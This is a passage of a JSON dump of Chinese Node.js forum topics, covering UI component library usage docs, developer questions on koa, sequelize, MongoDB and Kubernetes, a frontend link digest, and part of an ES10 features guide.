&#x27;提示&#x27;,\n  message: &#x27;出错了&#x27;,\n  buttons: [\n\t\t{\n\t\t\ttext :&#x27;我已经了解了&#x27;,\n\t\t\tcallback: function(){\n\t\t\t\talert(122);\n\t\t\t}\n\t\t}\n\t]\n});\n</code></pre><p><strong>Swiper用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*container：必填项操作的DOM\n*wrapper：操作父dom\n*slide：滚动列表\n*initialSlide:从第几项开始\n*direction：滚动方向(horizontal(横向),vertical(纵向))\n*autoplay: 自由滚动\n*pagination：索引\n*startFn：开始函数\n*endFn: 滚动结束函数\n---------*&#x2F;\nnew Swiper(&#x27;#swiper-container&#x27;,{\n\twrapper: &#x27;.swiper-wrapper&#x27;,\n\tslide: &#x27;.swiper-slide&#x27;,\n\tinitialSlide:5,\n\tdirection: &#x27;horizontal&#x27;,\n\tautoplay: 5000,\n\tpagination: &#x27;.swiper-pagination&#x27;,\n\tstartFn: function(){},\n\tendFn: function(){}\n});\n</code></pre><p><strong>CityPicker用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*container：必填项操作的DOM\n*url:地址数据来源\n*eventName:事件类型\n*value:返回的数据\n*coordinates[]返回的数据坐标\n---------*&#x2F;\nnew CityPicker(&#x27;#js-datetitmepicker&#x27;,{\n\teventName:&#x27;click&#x27;,\n\turl:&#x27;..&#x2F;js&#x2F;address.min.js&#x27;,\n\tvalue:[],\n\tselectedClass:&#x27;.c-gray&#x27;,\n\tcoordinates:[0,0,0]\n});\n</code></pre><p><strong>DatetimePicker用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*container：必填项操作的DOM\n*type:类型（date：日期，datetime:时间，custom:自定义数据）\n*eventName:事件类型\n*cols:数据\n*selectedClass 有值时按钮的样式\n*value:返回的数据\n*connector:连接符号\n*callback:返回的函数\n---------*&#x2F;\nnew DatetimePicker(&#x27;#js-datetitmepicker&#x27;,{\n\ttype:&#x27;date&#x27;,\n\teventName:&#x27;click&#x27;,\n\tcols: cols,\n\tselectedClass:&#x27;&#x27;,\n\tconnector:&#x27;-&#x27;,\n\tcallBack:function(){}\n});\n</code></pre><p><strong>Tab用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*defaultIndex:默认项  \n*event:事件  \n*activeClass:选中class  \n*is_slide:是否可滑动  \n---------*&#x2F;\n$(&#x27;#js-tab1&#x27;).tab({\n\tdefaultIndex : 0,\n\tactiveClass : &#x27;ui-tab-red&#x27;,\n\tis_slide : true\n});\n</code></pre><p><strong>Range用法</strong></p>\n<pre class=\"prettyprint language-js\\n\"><code>&#x2F;*config参数说明\n*---------\n*min:最大值 \n*max:最小值 \n*step:步长\n*defaltValue:默认值 \n*disable:是否可滑动\n*starFn:callback\n*moveFn:callback\n*endFn:callback \n---------*&#x2F;\n$(&#x27;#slider1&#x27;).range({\n\tmin: 0,\n\tmax: 36,\n\tstep: 1,\n\tdefaultValue: 12,\n\tstartFn:function(value){$(&#x27;.text1&#x27;).text(value + &#x27;月&#x27;);},\n\tmoveFn: function(value){$(&#x27;.text1&#x27;).text(value + &#x27;月&#x27;);},\n\tendFn: function(value){}\n})\n</code></pre></div>","title":"移动端基于jquery,zepto开发的UI组件库,求star","last_reply_at":"2019-03-15T01:44:37.698Z","good":false,"top":false,"reply_count":3,"visit_count":3947,"create_at":"2017-06-06T10:10:51.230Z","author":{"loginname":"myfirebug","avatar_url":"https://avatars3.githubusercontent.com/u/8624981?v=4&s=120"}},{"id":"5c89d62a7ce0df3732427d03","author_id":"50b5bc5d637ffa4155091236","tab":"ask","content":"<div class=\"markdown-text\"><p>总体来说</p>\n</div>","title":"nodejs和python相比，哪个坑多一些？","last_reply_at":"2019-03-15T01:18:45.391Z","good":false,"top":false,"reply_count":7,"visit_count":835,"create_at":"2019-03-14T04:18:50.939Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5c8af666acb681372d418324","author_id":"5c3a86a23898674067a7e824","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://i.loli.net/2019/03/15/5c8af37b11ac7.jpg\" alt></p>\n<h2>缘起</h2>\n<p>去年 12 月玩守望等匹配的时候就无聊萌生出做一套守望 UI 的想法，因为觉得守望的 UI 比较简洁，而且对于那些小组件的实现都有个大概的思路。当时 Hey UI 的作者也在知乎上宣传自己的 UI 库，所以更加坚定了做这个 UI 库的想法。</p>\n<p>调研了之后还真发现已经有人用 React 写了 4 个守望的组件了。</p>\n<p><img src=\"https://i.loli.net/2019/03/15/5c8af32d96f93.png\" alt></p>\n<p>他是用 React.js 写的，不过他写不是很全，没有形成一个库。既然没有同类型的产品，那就我来用 Vue.js 搞一个吧。所以今年写完代码高亮插件后，在一些契机下开始动工。</p>\n<h2>文档</h2>\n<p>整个库所使用到的有 Vue.js + Karam, Mocha, Chai，<a href=\"https://www.npmjs.com/package/overwatch-ui\">可以从 npm 下载试试~</a></p>\n<p><a href=\"https://haixiang6123.github.io/overwatch-ui-doc/#/\">Overwatch UI 文档</a></p>\n<p><a href=\"https://github.com/Haixiang6123/overwatch-ui\">Overwatch UI Github</a></p>\n<p><img src=\"https://i.loli.net/2019/03/15/5c8af36277632.png\" alt></p>\n<h2>后记</h2>\n<p>其实整个 UI 库真的有用么？做完之后其实不见得有用 :(，单从设计上来说这个库和网页开发的配合不是那么的好。</p>\n<p>因为游戏一般是有鲜明的背影图的，所以它的很多组件都是有透明度的，而网页一般以白色为底，所以组件在网页上有点“看不清”。而且守望的组件 UI 逻辑和网页也不太一样，为了凸显游戏本身它的组件做得很“浅”，再用到网页上就不好看了，但是如果加背景图应该会好点。</p>\n<p>虽然没啥用吧，但是收获还是很大的，不仅熟悉了市面上 UI 库的很多 API，也对自己的 Vue.js 有个提升，还有接触到了以前从没有用过的单元测试，当然也被 Vue-cli-3, Karam 等配置坑过几遍。</p>\n<p>总之，3 个月的制作过程也是很有趣的，这个库的开发算是告一段落了，该期末考了。</p>\n</div>","title":"守望先锋 UI 库","last_reply_at":"2019-03-15T01:18:22.477Z","good":false,"top":false,"reply_count":2,"visit_count":726,"create_at":"2019-03-15T00:48:38.853Z","author":{"loginname":"Haixiang6123","avatar_url":"https://avatars1.githubusercontent.com/u/17061654?v=4&s=120"}},{"id":"5c8a924f7ce0df37324280db","author_id":"5b1f81a38a4f51e140d94764","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-js\\n\"><code>const Koa = require(&#x27;koa&#x27;)\nconst app = new Koa()\nconst bodyParser = require(&#x27;koa-bodyparser&#x27;)\napp.use(bodyParser())\n\napp.use( async ( ctx ) =&gt; {\n\n  if ( ctx.url === &#x27;&#x2F;&#x27; &amp;&amp; ctx.method === &#x27;GET&#x27; ) {\n    let html = &#96;\n      &lt;h1&gt;koa2 request post demo&lt;&#x2F;h1&gt;\n      &lt;form method=&quot;POST&quot; action=&quot;&#x2F;&quot;&gt;\n        &lt;p&gt;userName&lt;&#x2F;p&gt;\n        &lt;input name=&quot;userName&quot; &#x2F;&gt;&lt;br&#x2F;&gt;\n        &lt;p&gt;nickName&lt;&#x2F;p&gt;\n        &lt;input name=&quot;nickName&quot; &#x2F;&gt;&lt;br&#x2F;&gt;\n        &lt;p&gt;email&lt;&#x2F;p&gt;\n        &lt;input name=&quot;email&quot; &#x2F;&gt;&lt;br&#x2F;&gt;\n        &lt;button type=&quot;submit&quot;&gt;submit&lt;&#x2F;button&gt;\n      &lt;&#x2F;form&gt;\n    &#96;\n    ctx.body = html\n  } else if ( ctx.url === &#x27;&#x2F;&#x27; &amp;&amp; ctx.method === &#x27;POST&#x27; ) {\n    let postData = ctx.request.body\n    &#x2F;&#x2F; 这里可以拿到ctx.request.body的值但是打印ctx.request对象下的key值为什么没有body？\n    console.log(ctx.request)\n    ctx.body = postData\n  } else {\n    ctx.body = &#x27;&lt;h1&gt;404！！！ o(╯□╰)o&lt;&#x2F;h1&gt;&#x27;\n  }\n})\n\napp.listen(3000, () =&gt; {\n  console.log(&#x27;[demo] request post is starting at port 3000&#x27;)\n})</code></pre></div>","title":"关于koa-bodyparser的问题","last_reply_at":"2019-03-15T01:12:14.123Z","good":false,"top":false,"reply_count":7,"visit_count":379,"create_at":"2019-03-14T17:41:35.900Z","author":{"loginname":"xxLion","avatar_url":"https://avatars3.githubusercontent.com/u/26025205?v=4&s=120"}},{"id":"5c88d8407ce0df3732427a8c","author_id":"58bd6b91d282728c0ec401b4","tab":"ask","content":"<div class=\"markdown-text\"><p>看了文档，还是没试出来，使用references后建表，发现还是有外键。\n求教 各位大神\n怎么才能使用sequelize的联表查询，又不会往数据库里建立外键。\n非常感谢！！</p>\n</div>","title":"sequelize怎么建关联，但不引入物理外键","last_reply_at":"2019-03-15T01:10:17.377Z","good":false,"top":false,"reply_count":3,"visit_count":394,"create_at":"2019-03-13T10:15:28.129Z","author":{"loginname":"chengshubei","avatar_url":"https://avatars3.githubusercontent.com/u/24501068?v=4&s=120"}},{"id":"5c890fe3acb681372d417d45","author_id":"5a72ca56ce45d440451465c6","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>如题，我用手机4G网络开热点给笔记本连接，然后笔记本起了一个node服务器，然后我在笔记本用ipconfig拿到我的ip地址，但是我的手机访问不了我笔记本起的服务器.</strong>\n<strong>但是我直接在我电脑输入这个ip+端口是可以访问到的</strong></p>\n</div>","title":"手机给电脑开热点算是手机电脑在同一局域网下吗?","last_reply_at":"2019-03-14T09:59:20.434Z","good":false,"top":false,"reply_count":2,"visit_count":599,"create_at":"2019-03-13T14:12:51.673Z","author":{"loginname":"heguangda","avatar_url":"https://avatars1.githubusercontent.com/u/29668335?v=4&s=120"}},{"id":"5c89cab2acb681372d417ec6","author_id":"59db2bf1f7cc61fb67daaed0","tab":"ask","content":"<div class=\"markdown-text\"><p>比如上传的图片进行处理 定义压缩百分之几或者压缩的尺寸  哪种方式处理比较好</p>\n</div>","title":"nodejs压缩图片 大家都是用什么模块去压缩","last_reply_at":"2019-03-14T07:08:01.207Z","good":false,"top":false,"reply_count":1,"visit_count":617,"create_at":"2019-03-14T03:29:54.987Z","author":{"loginname":"weizhuanhua","avatar_url":"https://avatars1.githubusercontent.com/u/32627421?v=4&s=120"}},{"id":"5c88cc08acb681372d417c06","author_id":"5a52d060a89c475d7ea4fac3","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，mongodb的连接选择在什么时候检查？是在项目启动的时候检查还是在需要查询数据库的时候检查？具体的优缺点在哪？</p>\n</div>","title":"在架构中，mongodb的连接选择在什么时候检查？","last_reply_at":"2019-03-14T06:31:05.139Z","good":false,"top":false,"reply_count":5,"visit_count":568,"create_at":"2019-03-13T09:23:20.503Z","author":{"loginname":"yss1993","avatar_url":"https://avatars1.githubusercontent.com/u/24558693?v=4&s=120"}},{"id":"5c72846ce1a81129a7ada0e9","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>虽然语法上能否这么写，但是这样做调用，好像没有什么意义~~</p>\n</div>","title":"请问下 controller 中函数允许调用其他 controller 函数不","last_reply_at":"2019-03-14T06:26:03.894Z","good":false,"top":false,"reply_count":7,"visit_count":810,"create_at":"2019-02-24T11:47:56.719Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c7c9b9690c14711cc8c9f2d","author_id":"5934bb555b07c1b24afa067e","tab":"ask","content":"<div class=\"markdown-text\"><p>在我们开发rest api时，有些接口处理时间比较长，可能直接先返回，然后生成一个任务，放在后台执行。</p>\n<p>面对这样的需求，请问一般是通过什么方式进行处理，比如生产者消费者模式？</p>\n</div>","title":"怎么设计异步的Rest api？","last_reply_at":"2019-03-14T03:37:07.406Z","good":false,"top":false,"reply_count":10,"visit_count":1055,"create_at":"2019-03-04T03:29:26.150Z","author":{"loginname":"zhengboah","avatar_url":"https://avatars3.githubusercontent.com/u/17705410?v=4&s=120"}},{"id":"5c887479acb681372d41797e","author_id":"5ab1e8e8e7b166bb7b9ecca9","tab":"ask","content":"<div class=\"markdown-text\"><h1>新增一个成功</h1>\n<pre class=\"prettyprint\"><code>\n            await this.ctx.model.RolePermission.create({\n                role_id: 2,\n                permission_id: 2\n\t\t\t)}\n</code></pre><h1>新增多个失败</h1>\n<pre class=\"prettyprint\"><code>            let id = body.roleId;\n            let permissionId = body.access_node;\n            console.log(&#x27;wwwwww&#x27;)\n            console.log(id) &#x2F;&#x2F;1\n            console.log(permissionId) &#x2F;&#x2F;[2,3,4]\n\n            &#x2F;&#x2F; 新增多个，失败\n             permissionId.forEach(item =&gt; {\n                 await this.ctx.model.RolePermission.create({\n                     role_id: id,\n                     permission_id: parseInt(item)\n                 })\n             })\n\n</code></pre></div>","title":"sequlize如何新增多个create()","last_reply_at":"2019-03-14T01:45:06.572Z","good":false,"top":false,"reply_count":8,"visit_count":395,"create_at":"2019-03-13T03:09:45.757Z","author":{"loginname":"1134506391","avatar_url":"https://avatars2.githubusercontent.com/u/30287598?v=4&s=120"}},{"id":"5c85d5087ce0df3732426c99","author_id":"5732e4852e11c7a80c33f8aa","tab":"ask","content":"<div class=\"markdown-text\"><p>现在服务要上k8s，使用了pubsub，多个实例都会订阅redis事件，如何只让任一个单一实例收到通知，而非所有实例。\n还是会有更好的方式处理这种多实例的问题？</p>\n</div>","title":"k8s如何实现node.js服务使用pubsubN个实例只通知单个任一实例。","last_reply_at":"2019-03-14T00:47:32.103Z","good":false,"top":false,"reply_count":7,"visit_count":719,"create_at":"2019-03-11T03:24:56.594Z","author":{"loginname":"evershy","avatar_url":"https://avatars2.githubusercontent.com/u/9037313?v=4&s=120"}},{"id":"5c88aa517ce0df373242792c","author_id":"593129689a99de3b489289c5","tab":"ask","content":"<div class=\"markdown-text\"><p>最近和别的公司对接业务 对方是java服务发送的 base64加密后的json串\n我们这边express服务接受不到，看了下body-parse里面解析时直接抛出错误了\n<img src=\"//static.cnodejs.org/Fjgp1Rp0BH6ZUP-gCNn86k3AZM8i\" alt=\"image.png\">\n想请教下node里面一般是怎么解决这种情况的</p>\n</div>","title":"express中 body-parse 解析body里 Base64 加密的 JSON","last_reply_at":"2019-03-13T10:36:14.818Z","good":false,"top":false,"reply_count":1,"visit_count":329,"create_at":"2019-03-13T06:59:29.793Z","author":{"loginname":"qqxwbtt","avatar_url":"https://avatars3.githubusercontent.com/u/28970770?v=4&s=120"}},{"id":"5c88d08c7ce0df3732427a51","author_id":"5c88ce7aacb681372d417c34","tab":"share","content":"<div class=\"markdown-text\"><p>前端行业发展飞速，新技术如雨后春笋般快速出现，尤其是各种小程序陆续推出，相关的信息、文章也铺天盖地的遍布在各处，我们有时候会困惑，不知道哪些信息对于自己是有价值的，那么TNFE-腾讯新闻前端团队启动了这个周刊项目，为所有的前端开发人员整理出小程序相关以及其它web前端技术领域的精品内容。</p>\n<p>我们坚持每周为你提供高质量的关于小程序、h5等前端领域的文章和项目。</p>\n<p><strong>项目地址</strong>\n<a href=\"https://github.com/Tnfe/TNFE-Weekly\">https://github.com/Tnfe/TNFE-Weekly</a></p>\n<p><strong>第十周</strong></p>\n<ol>\n<li><a href=\"https://juejin.im/post/5c7de1f9e51d457cb60884fc\">一款小而美的小程序脚手架，让你更流畅的开发小程序</a></li>\n<li><a href=\"https://juejin.im/post/5c80b548518825407b2b64a4\">记一次Promise在api接口合并中的实践</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/wzvqyhQWtyMQm1QAS83aHg\">京东Vue组件库NutUI 2.0发布：将支持跨平台！</a></li>\n<li><a href=\"https://juejin.im/post/5c7e6857e51d4542194f8c6f\">JS 中的 Reflect 和 Proxy</a></li>\n<li><a href=\"https://www.moxio.com/blog/19/event-stoppropagation-in-a-modular-system\">event.stopPropagation() in a modular system</a></li>\n<li><a href=\"https://pqina.nl/blog/applying-styles-based-on-the-user-scroll-position-with-smart-css/\">Applying Styles Based on the User Scroll Position with Smart CSS</a></li>\n<li><a href=\"https://itnext.io/ast-for-javascript-developers-3e79aeb08343\">AST for JavaScript developers</a></li>\n<li><a href=\"https://medium.freecodecamp.org/the-difference-between-a-framework-and-a-library-bd133054023f\">The Difference Between a Framework and a Library</a></li>\n</ol>\n<p><strong>欢迎参与</strong>\n如果你有兴趣参与，可以把发现的有价值的信息、文章等在<a href=\"https://github.com/Tnfe/TNFE-Weekly/issues\">Issues</a>里提给我们，记得写上推荐的理由哈，我们会尽快处理。有建议和意见也欢迎到<a href=\"https://github.com/Tnfe/TNFE-Weekly/issues\">Issues</a>提出。</p>\n<p><strong>团队博客</strong>\n<a href=\"https://segmentfault.com/blog/tnfe\">腾讯新闻前端团队-TNFE</a></p>\n<p><strong>团队Github</strong>\n<a href=\"https://github.com/Tnfe\">TNFE</a></p>\n</div>","title":"TNFE-Weekly[第十周已更新]","last_reply_at":"2019-03-13T09:42:36.809Z","good":false,"top":false,"reply_count":0,"visit_count":512,"create_at":"2019-03-13T09:42:36.809Z","author":{"loginname":"JN-H","avatar_url":"https://avatars3.githubusercontent.com/u/35625824?v=4&s=120"}},{"id":"59479de8325c502917ef0bb6","author_id":"573d5b86542374db1db0a593","tab":"ask","content":"<div class=\"markdown-text\"><p>A表中ref了B表，B表有一个字段state\n写一个查询体对象,找出所有B的state=2的A的信息\nlet query = {};\nquery = ？？？？</p>\n</div>","title":"mongoose 关联条件查询怎么写？","last_reply_at":"2019-03-13T07:05:03.559Z","good":false,"top":false,"reply_count":11,"visit_count":2520,"create_at":"2017-06-19T09:48:24.629Z","author":{"loginname":"94007boy","avatar_url":"https://avatars2.githubusercontent.com/u/7677059?v=3&s=120"}},{"id":"5c78f0645b8cb21491ca4f77","author_id":"59bb6e2d3c896622428ec766","tab":"ask","content":"<div class=\"markdown-text\"><p>用户——&gt;Client(浏览器)——&gt;service(用来请求后端的数据)——&gt;backend，其中client和service是一体的。遇到一个问题，backend的数据返回给了service，service把数据返回给client，由于client的网速很慢，导致用户看到了client报出的超时错误。\n问题：</p>\n<ol>\n<li>为什么需要service层（我们老大解释说，为了统一。还能避免跨域请求的问题）；</li>\n<li>client和service的代码是一体的，一个服务，它的代码怎么知道哪些是在浏览器执行，哪些是在node执行呢？</li>\n</ol>\n</div>","title":"前端为什么会有service层","last_reply_at":"2019-03-13T06:35:43.504Z","good":false,"top":false,"reply_count":12,"visit_count":1479,"create_at":"2019-03-01T08:42:12.669Z","author":{"loginname":"gyj1278","avatar_url":"https://avatars0.githubusercontent.com/u/12684904?v=4&s=120"}},{"id":"5c88767c7ce0df37324277d4","author_id":"5c8870d77ce0df3732427798","tab":"share","content":"<div class=\"markdown-text\"><p>线上：<a href=\"http://vue-cnode.oemsun.com/\">http://vue-cnode.oemsun.com/</a>\n源码：<a href=\"https://github.com/lidysun/vue-cnode\">https://github.com/lidysun/vue-cnode</a>\n欢迎砸星星与鸡蛋</p>\n</div>","title":"vue vue-router axios 仿了一个cnode","last_reply_at":"2019-03-13T06:15:25.260Z","good":false,"top":false,"reply_count":3,"visit_count":351,"create_at":"2019-03-13T03:18:20.723Z","author":{"loginname":"lidysun","avatar_url":"https://avatars2.githubusercontent.com/u/19599953?v=4&s=120"}},{"id":"5c75f39cab86b86ddf6b32a5","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 最新的JS特性。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000018311280\">ES10 特性的完整指南</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p><img src=\"https://image.fundebug.com/2019-02-26-01.png\" alt></p>\n<p>ES10 还只是一个草案。但是除了 <code>Object.fromEntries</code> 之外，Chrome 的大多数功能都已经实现了，为什么不早点开始探索呢?当所有浏览器都开始支持它时，你将走在前面，这只是时间问题。</p>\n<p>在新的语言特性方面，ES10 不如 ES6 重要，但它确实添加了一些有趣的特性(其中一些功能目前还无法在浏览器中工作: 2019/02/21)</p>\n<p>在 ES6 中，箭头函数无疑是最受欢迎的新特性，在 ES10 中会是什么呢?</p>\n<ul>\n<li>String .matchAll()</li>\n<li>Dynamic import()</li>\n<li>Array .flat() .flatMap()</li>\n<li>Object .fromEntries()</li>\n<li>String .trimStart() .trimEnd()</li>\n<li>well-formed JSON.stringify()</li>\n<li>stable Array .sort()</li>\n<li>new Function .toString()</li>\n<li>Standardized globalThis object</li>\n</ul>\n<h3>BigInt：任意精度整数</h3>\n<p><strong>BigInt</strong> 是第七种 <strong>原始类型。</strong></p>\n<p>BigInt 是一个任意精度的整数。这意味着变量现在可以 <code>表示²⁵³</code> 数字，而不仅仅是<code>9007199254740992</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>const b = 1n;  &#x2F;&#x2F; 追加 n 以创建 BigInt\n</code></pre><p>在过去，不支持大于 <code>9007199254740992</code> 的整数值。如果超过，该值将锁定为 <code>MAX_SAFE_INTEGER + 1</code>:</p>\n<pre class=\"prettyprint language-javascript\"><code>const limit = Number.MAX_SAFE_INTEGER;\n⇨ 9007199254740991\nlimit + 1;\n⇨ 9007199254740992\nlimit + 2;\n⇨ 9007199254740992 &lt;--- MAX_SAFE_INTEGER + 1 exceeded\nconst larger = 9007199254740991n;\n⇨ 9007199254740991n\nconst integer = BigInt(9007199254740991); &#x2F;&#x2F; initialize with number\n⇨ 9007199254740991n\nconst same = BigInt(&quot;9007199254740991&quot;); &#x2F;&#x2F; initialize with &quot;string&quot;\n⇨ 9007199254740991n\n</code></pre><h4>typeof</h4>\n<pre class=\"prettyprint language-javascript\"><code>typeof 10;\n⇨ &#x27;number&#x27;\ntypeof 10n;\n⇨ &#x27;bigint&#x27;\n</code></pre><h4>等于运算符可用于两种类型之间比较</h4>\n<pre class=\"prettyprint language-javascript\"><code>10n === BigInt(10);\n⇨ true\n10n == 10;\n⇨ true\n</code></pre><h4>数学运算符只能在自己的类型中工作</h4>\n<pre class=\"prettyprint language-javascript\"><code>200n &#x2F; 10n\n⇨ 20n\n200n &#x2F; 20\n⇨ Uncaught TypeError:\n   Cannot mix BigInt and other types, use explicit conversions &lt;\n</code></pre><h4>－运算符可以操作， + 不可用</h4>\n<pre class=\"prettyprint language-javascript\"><code>-100n\n⇨ -100n\n+100n\n⇨ Uncaught TypeError:\n  Cannot convert a BigInt value to a number\n</code></pre><p>当你读到这篇文章的时候，<strong>matchAll</strong> 可能已经在 Chrome C73 中正式实现了——如果不是，它仍然值得一看。特别是如果你是一个正则表达式(<strong>regex</strong>)爱好者。</p>\n<h3>string.prototype.matchAll()</h3>\n<p>如果您运行谷歌搜索<strong>JavaScript string match all</strong>，第一个结果将是这样的：如何编写正则表达式“match all”？</p>\n<p>最佳结果将建议 <strong>String.match</strong> 与正则表达式和 <strong>/g</strong> 一起使用或者带有 <strong>/g</strong> 的 <strong>RegExp.exec</strong> 或者带有 <strong>/g</strong> 的 <strong>RegExp.test</strong> 。</p>\n<p>首先，让我们看看旧规范是如何工作的。</p>\n<p>带字符串参数的 <strong>String.match</strong> 仅返回第一个匹配：</p>\n<pre class=\"prettyprint language-javascript\"><code>let string = &#x27;Hello&#x27;;\nlet matches = string.match(&#x27;l&#x27;);\nconsole.log(matches[0]); &#x2F;&#x2F; &quot;l&quot;\n</code></pre><p>结果是单个 <code>&quot;l&quot;</code>（注意：匹配存储在 matches[0] 中而不是 matches）</p>\n<p>在<code>“hello”</code>中搜索 <code>&quot;l&quot;</code> 只返回 <code>&quot;l&quot;</code>。</p>\n<p>将 <strong>string.match</strong> 与 <strong>regex</strong> 参数一起使用也是如此：</p>\n<p>让我们使用正则表达式 <code>/l/</code> 找到字符 串“hello” 中的 <code>“l”</code> 字符：</p>\n<pre class=\"prettyprint language-javascript\"><code>let string = &quot;Hello&quot;;\nlet matches = string.match(&#x2F;l&#x2F;);\nconsole.log(matches[0]); &#x2F;&#x2F; &quot;l&quot;\n</code></pre><h4>添加 /g 混合</h4>\n<pre class=\"prettyprint language-javascript\"><code>let string = &quot;Hello&quot;;\nlet ret = string.match(&#x2F;l&#x2F;g); &#x2F;&#x2F; (2) [“l”, “l”];\n</code></pre><p>很好，我们使用 &lt; ES10 方式得到了多个匹配，它一直起作用。</p>\n<p>那么为什么要使用全新的 <strong>matchAll</strong> 方法呢? 在我们更详细地回答这个问题之前，让我们先来看看 <strong>捕获组</strong>。如果不出意外，你可能会学到一些关于正则表达式的新知识。</p>\n<h4>正则表达式捕获组</h4>\n<p>在 regex 中捕获组只是从 <strong>()</strong> 括号中提取一个模式，可以使用 <strong>/regex/.exec(string)</strong> 和<strong>string.match</strong> 捕捉组。</p>\n<p>常规捕获组是通过将模式包装在 <strong>(pattern)</strong> 中创建的，但是要在结果对象上创建 <code>groups</code> 属性，它是: <code>(?&lt;name&gt;pattern)</code>。</p>\n<p>要创建一个新的组名，只需在括号内附加 <strong>?&lt;name&gt;</strong>，结果中，分组 (pattern) 匹配将成为 <strong><a href=\"http://group.name\">group.name</a></strong>，并附加到 <strong>match</strong>对象，以下是一个实例：</p>\n<p>字符串标本匹配：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-26-02.png\" alt></p>\n<p>这里创建了 match.groups.<strong>color</strong> 和 match.groups.<strong>bird</strong> ：</p>\n<pre class=\"prettyprint language-javascript\"><code>const string = &#x27;black*raven lime*parrot white*seagull&#x27;;\nconst regex = &#x2F;(?&lt;color&gt;.*?)\\*(?&lt;bird&gt;[a-z0-9]+)&#x2F;g;\nwhile (match = regex.exec(string))\n{\n    let value = match[0];\n    let index = match.index;\n    let input = match.input;\n    console.log(&#96;${value} at ${index} with &#x27;${input}&#x27;&#96;);\nconsole.log(match.groups.color);\n    console.log(match.groups.bird);\n}\n</code></pre><p>需要多次调用 <strong>regex.exec</strong> 方法来遍历整个搜索结果集。 在每次迭代期间调用**.exec** 时，将显示下一个结果（它不会立即返回所有匹配项。），因此使用 <strong>while</strong> 循环。</p>\n<p>输出如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>black*raven at 0 with &#x27;black*raven lime*parrot white*seagull&#x27;\nblack\nraven\nlime*parrot at 11 with &#x27;black*raven lime*parrot white*seagull&#x27;\nlime\nparrot\nwhite*seagull at 23 with &#x27;black*raven lime*parrot white*seagull&#x27;\nwhite\nseagull\n</code></pre><p><strong>但奇怪的是:</strong></p>\n<blockquote>\n<p>如果你从这个正则表达式中删除 <strong>/g</strong>，你将永远在第一个结果上创建一个无限循环。这在过去是一个巨大的痛苦。想象一下，从某个数据库接收正则表达式时，你不确定它的末尾是否有 <strong>/g</strong>，你得先检查一下。</p>\n</blockquote>\n<h4><strong>使用 .matchAll() 的好理由</strong></h4>\n<ol>\n<li>在与捕获组一起使用时，它可以<strong>更加优雅</strong>,捕获组只是使用 <strong>()</strong> 提取模式的正则表达式的一部分。</li>\n<li>它<strong>返回一个迭代器而</strong>不是一个数组，迭代器本身是有用的。</li>\n<li>迭代器可以使用扩展运算符 (…) 转换为数组。</li>\n<li>它避免了带有 <strong>/g</strong> 标志的正则表达式，当从数据库或外部源检索未知正则表达式并与陈旧的<strong>RegEx</strong> 对象一起使用时，它非常有用。</li>\n<li>使用 <strong>RegEx</strong> 对象创建的正则表达式不能使用点 <strong>(.)</strong> 操作符链接。</li>\n<li>高级: <strong>RegEx</strong> 对象更改跟踪最后匹配位置的内部 <strong>.lastindex</strong> 属性，这在复杂的情况下会造成严重破坏。</li>\n</ol>\n<h4>.matchAll() 是如何工作的?</h4>\n<p>让我们尝试匹配单词 <code>hello</code> 中字母 <code>e</code> 和 <code>l</code> 的所有实例， 因为返回了迭代器，所以可以使用 <strong>for…of</strong> 循环遍历它：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; Match all occurrences of the letters: &quot;e&quot; or &quot;l&quot; \nlet iterator = &quot;hello&quot;.matchAll(&#x2F;[el]&#x2F;);\nfor (const match of iterator)\n    console.log(match);\n</code></pre><p>这一次你可以跳过 <strong>/g</strong>， <code>.matchall</code> 方法不需要它，结果如下:</p>\n<pre class=\"prettyprint language-javascript\"><code>[ &#x27;e&#x27;, index: 1, input: &#x27;hello&#x27; ] &#x2F;&#x2F; Iteration 1\n[ &#x27;l&#x27;, index: 2, input: &#x27;hello&#x27; ] &#x2F;&#x2F; Iteration 2\n[ &#x27;l&#x27;, index: 3, input: &#x27;hello&#x27; ] &#x2F;&#x2F; Iteration 3\n</code></pre><h4>使用 .matchAll() 捕获组示例：</h4>\n<p><strong>.matchAll</strong> 具有上面列出的所有好处。它是一个迭代器，可以用 <strong>for…of</strong> 循环遍历它,这就是整个语法的不同。</p>\n<pre class=\"prettyprint language-javascript\"><code>const string = &#x27;black*raven lime*parrot white*seagull&#x27;;\nconst regex = &#x2F;(?&lt;color&gt;.*?)\\*(?&lt;bird&gt;[a-z0-9]+)&#x2F;;\nfor (const match of string.matchAll(regex)) {\n    let value = match[0];\n    let index = match.index;\n    let input = match.input;\n    console.log(&#96;${value} at ${index} with &#x27;${input}&#x27;&#96;);\nconsole.log(match.groups.color);\n    console.log(match.groups.bird);\n}\n</code></pre><p>请注意已经没有 <strong>/g</strong> 标志，因为 <strong>.matchAll()</strong> 已经包含了它，打印如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>black*raven at 0 with &#x27;black*raven lime*parrot white*seagull&#x27;\nblack\nraven\nlime*parrot at 11 with &#x27;black*raven lime*parrot white*seagull&#x27;\nlime\nparrot\nwhite*seagull at 23 with 